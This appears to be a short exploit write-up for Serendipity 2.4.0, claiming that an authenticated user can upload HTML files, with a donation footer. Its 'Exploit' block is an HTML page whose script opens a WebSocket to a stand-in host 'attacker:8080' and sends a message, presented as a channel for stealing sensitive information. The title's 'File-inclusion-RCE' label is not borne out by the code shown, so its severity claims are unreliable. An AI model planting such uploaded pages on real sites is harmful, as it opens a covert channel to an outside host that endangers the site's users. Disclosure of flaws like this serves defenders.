## [serendipity-2.4.0-File-inclusion-RCE-user-interaction](https://github.com/s9y/Serendipity/releases/tag/2.4.0)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/s9y/2023/Serendipity-2.4.0/docs/Screenshot%202023-04-26%20224840.png)

## Description:
The already authenticated attacker can upload HTML files on the server, which is absolutely dangerous and STUPID
In this file, the attacker can be codding a malicious web-socket responder that can connect with some nasty webserver somewhere. It depends on the scenario, the attacker can steal every day very sensitive information, for a very long period of time, until the other users will know that something is not ok with this system, and they decide to stop using her, but maybe they will be too late for this decision.

STATUS: HIGH Vulnerability

[+]Exploit:
```HTML
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>NodeJS WebSocket Server</title>
</head>
<body>
	<h1>You have just sent a message to your attacker,<br>
	<h1>that you are already connected to him.</h1>
<script>
const ws = new WebSocket("ws://attacker:8080");
ws.addEventListener("open", () =>{
  console.log("We are connected to you");
  ws.send("How are you, dear :)?");
});
 
ws.addEventListener('message', function (event) {
    console.log(event.data);
});
</script>
</body>
</html>

```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/s9y/2023/Serendipity-2.4.0)

## Proof and Exploit:
[href](https://streamable.com/2s80z6)

## Time spend:
01:27:00

<html>
	<b>You can donate if you want this blog to exist!</b><br>
	<b>Best Regards.</b><br>
</html>     
<!DOCTYPE html>
<html>
<body>
  <a href="https://www.paypal.com/donate/?hosted_button_id=DST34GVWCVFJ4"><img src="https://raw.githubusercontent.com/nu11secur1ty/nu11secur1ty/master/logo/donate.png"   alt="HTML tutorial" style="width:150px;height:70px;"></a>
</body>
</html><br>
            
          </div>
     </body>
</html>
